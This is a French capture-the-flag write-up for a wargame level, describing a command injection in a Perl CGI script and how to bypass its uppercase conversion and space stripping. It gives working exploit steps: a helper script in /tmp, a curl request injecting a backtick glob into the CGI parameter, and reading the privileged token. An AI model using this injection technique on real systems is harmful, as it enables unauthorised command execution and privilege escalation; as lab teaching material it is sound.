# Level12 — Command Injection (CGI Perl + glob)

## Fichier fourni

Script Perl CGI sur `localhost:4646/level12.pl`, paramètres `x` et `y`.

## Analyse du code vulnérable

```perl
$xx =~ tr/a-z/A-Z/;     # converti x en majuscules
$xx =~ s/\s.*//;         # supprime tout après le premier espace
@output = `egrep "^$xx" /tmp/xd 2>&1`;  # injection ici
```

`$xx` est injecté directement dans une commande shell entre backticks sans sanitisation — **command injection**.

## Obstacles

1. **Majuscules** : `$xx` est converti en majuscules → impossible d'appeler `getflag` directement
2. **Espaces supprimés** : impossible d'injecter des arguments avec espaces

## Exploitation

**Contournement majuscules** : créer un script `/tmp/GETFLAG` (déjà en majuscules). Le chemin `/tmp/` devient `/TMP/` après conversion — mais `tr/a-z/A-Z/` ne touche pas les caractères non-alphabétiques (`/`, `*`). On utilise un glob `/*/GETFLAG` qui résout en `/tmp/GETFLAG` sans jamais écrire de minuscule.

**Exécution** : les backticks dans `$xx` sont aussi préservés par la conversion.

**Étapes :**

```sh
# 1. Créer le script en majuscules
echo 'getflag > /tmp/yes' > /tmp/GETFLAG
chmod +x /tmp/GETFLAG

# 2. Injecter via curl (backtick = %60 en URL)
curl "localhost:4646/level12.pl?x=%60/*/GETFLAG%60&y=1"

# 3. Lire le résultat
cat /tmp/yes
```

La commande exécutée devient :
```sh
egrep "^`/*/GETFLAG`" /tmp/xd
```

Le shell exécute `/tmp/GETFLAG` avant egrep — `getflag` tourne en tant que `flag12` (SUID) et écrit le token dans `/tmp/yes`.

```sh
su level13  # password = contenu de /tmp/yes (token retourné par getflag)
```

## Token

Voir `../flag`.
